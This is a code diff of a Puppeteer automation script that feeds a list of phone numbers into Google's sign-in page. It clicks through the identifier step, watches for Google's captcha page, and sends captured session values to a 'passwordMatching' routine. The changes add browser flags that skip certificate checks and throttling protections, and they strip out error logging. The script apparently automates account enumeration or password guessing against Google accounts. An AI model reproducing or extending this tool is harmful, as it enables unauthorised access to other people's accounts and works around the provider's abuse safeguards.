@@ -130,9 +130,7 @@ function dataCollect(update) {
                                         await page.goto(signIn)
                                         await numberType(page, '+'+mList[SIZE])
                                         await page.click('#identifierNext')
-                                    } catch (error) {
-                                        console.log('error p1')
-                                    }
+                                    } catch (error) {}
                                 }, 100)
                             } else {
                                 browserStart()
@@ -169,9 +167,7 @@ function dataCollect(update) {
                     await page.goto(signIn)
                     await numberType(page, '+'+mList[SIZE])
                     await page.click('#identifierNext')
-                } catch (error) {
-                    console.log('error p2')
-                }
+                } catch (error) {}
             }, 100)
         } else {
             browserStart()
@@ -186,7 +182,21 @@ async function browserStart() {
     try {
         let browser = await puppeteer.launch({
             headless: 'new',
-            args: [ '--no-sandbox', '--disable-setuid-sandbox', '--ignore-certificate-errors' ]
+            args: [
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--ignore-certificate-errors',
+                '--ignore-certificate-errors-skip-list',
+                '--disable-dev-shm-usage',
+                '--disable-accelerated-2d-canvas',
+                '--disable-background-timer-throttling',
+                '--disable-backgrounding-occluded-windows',
+                '--disable-breakpad',
+                '--disable-component-extensions-with-background-pages',
+                '--disable-extensions',
+                '--disable-features=TranslateUI,BlinkGenPropertyTrees',
+              '--disable-ipc-flooding-protection'
+            ]
         })
     
         page = (await browser.pages())[0]
@@ -241,6 +251,8 @@ async function browserStart() {
                                 gps = value.value
                             }
                         })
+
+                        page.goto('about:blank')
                 
                         passwordMatching(mList[SIZE], tl, parseInt(cid), decodeURIComponent(dsh), ifkv, gps, 0)
                     } else {
@@ -259,9 +271,7 @@ async function browserStart() {
                                 await page.goto(signIn)
                                 await numberType(page, '+'+mList[SIZE])
                                 await page.click('#identifierNext')
-                            } catch (error) {
-                                console.log('error p3')
-                            }
+                            } catch (error) {}
                         }
                     } else if(url.startsWith('https://accounts.google.com/Captcha')) {
                         if(!mCaptcha) {
@@ -325,7 +335,6 @@ async function browserStart() {
                     req.continue()
                 }  
             } catch (error) {
-                console.log('Error: '+req.url())
                 req.continue()
             }
         })
@@ -338,7 +347,7 @@ async function browserStart() {
         await numberType(page, '+'+mList[SIZE])
         await page.click('#identifierNext')
     } catch (error) {
-        console.log('error 1')
+       console.log(error) 
     }
 }
 
@@ -484,26 +493,13 @@ function nextNumber() {
     } else {
         setTimeout(async () => {
             try {
-                await page.goto(signIn)
+                await page.goto(signIn).catch(error => {
+                    console.log('GoTo Error:' + error)
+                })
                 await numberType(page, '+'+mList[SIZE])
                 await page.click('#identifierNext')
             } catch (error) {
-                console.log('error p4')
-                try {
-                    await page.goto('about:blank')
-
-                    setTimeout(async () => {
-                        try {
-                            await page.goto(signIn)
-                            await numberType(page, '+'+mList[SIZE])
-                            await page.click('#identifierNext')
-                        } catch (error) {
-                            console.log('error p6')
-                        }
-                    }, 2000)
-                } catch (error) {
-                    console.log('error p5')
-                }
+                console.log('GoTo try Error:' + error)
             }
         }, 100)
     }
